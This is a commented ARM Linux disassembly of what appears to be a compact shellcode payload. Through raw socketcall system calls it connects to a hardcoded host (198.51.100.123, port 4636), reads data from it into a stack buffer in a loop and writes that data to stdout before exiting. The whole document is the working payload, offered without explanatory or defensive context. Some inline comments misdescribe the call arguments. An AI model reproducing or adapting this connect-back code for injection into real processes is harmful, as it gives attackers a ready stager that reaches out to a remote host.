00010054 <.text>:
   10054:       e3a00002        mov     r0, #2
   10058:       e3a01001        mov     r1, #1
   1005c:       e3a02006        mov     r2, #6
   10060:       e92d0007        push    {r0, r1, r2}
   10064:       e3a00001        mov     r0, #1
   10068:       e1a0100d        mov     r1, sp
   1006c:       ef900066        svc     0x00900066      ; s = socketcall (r0 = 1 = socket, r1 = {2,1,6})
   10070:       e28dd00c        add     sp, sp, #12     ; Clean the stack
   10074:       e1a06000        mov     r6, r0          ; r6 = s
   10078:       e28f1070        add     r1, pc, #112    ; 0x70 -> Points to 0x100f0 (connect data
   1007c:       e3a02010        mov     r2, #16         
   10080:       e92d0007        push    {r0, r1, r2}
   10084:       e3a00003        mov     r0, #3
   10088:       e1a0100d        mov     r1, sp
   1008c:       ef900066        svc     0x00900066      ; socketcall (r0 = 3 = connect, r1 = {r0=s,1,6})
   10090:       e28dd014        add     sp, sp, #20     ; Clean up to much....(2 more words)
   10094:       e24d4f4f        sub     r4, sp, #316    ; 0x13c (allocate buffer) -> do not update sp
   10098:       e0455005        sub     r5, r5, r5      ; r5 = 0
   1009c:       e1a00006        mov     r0, r6          ; r0 = r6 = s
   100a0:       e1a01004        mov     r1, r4          ; r1 =r4 =  buffer
   100a4:       e3a02f4b        mov     r2, #300        ; r2 = 0x12c (size)
   100a8:       e3a03c01        mov     r3, #256        ; r3 = 0x100 = flags (MSG_WAITALL)
   100ac:       e92d000f        push    {r0, r1, r2, r3} 
   100b0:       e3a0000a        mov     r0, #10
   100b4:       e1a0100d        mov     r1, sp
   100b8:       ef900066        svc     0x00900066      ; socketcall (r0 = 10 = recv, r1 = {r0=s,1,6})
   100bc:       e28dd010        add     sp, sp, #16     ; Clean 4 words from stack
   100c0:       e0855000        add     r5, r5, r0      ; r5+= bytes read
   100c4:       e3500000        cmp     r0, #0          ; if  0 -> exit
   100c8:       da000004        ble     0x100e0
   100cc:       e1a02000        mov     r2, r0          ; r2 = r0 =bytes read
   100d0:       e3a00001        mov     r0, #1          ; r0 = 1 (stdout)
   100d4:       e1a01004        mov     r1, r4          ; r1 = buffer
   100d8:       ef900004        svc     0x00900004      ; write (r0 = 1, r1 = r4=buffer, r2=r0=len)
   100dc:       eaffffee        b       0x1009c         ; Repeat
   100e0:       e28ddf4f        add     sp, sp, #316    ; 0x13c (clean up stack)
   100e4:       e0400000        sub     r0, r0, r0
   100e8:       e3a07001        mov     r7, #1
   100ec:       ef000000        svc     0x00000000      ; sys_call (r7 = 1 (EXIT), r0 = 0)
	
   100f0:       1c120002        ldcne   0, cr0, [r2], {2} ; Port 0x1c12 (4636) | AF_INET (2)
   100f4:       7b6433c6        blvc    0x191d014         ; IP: 198.51.100.123
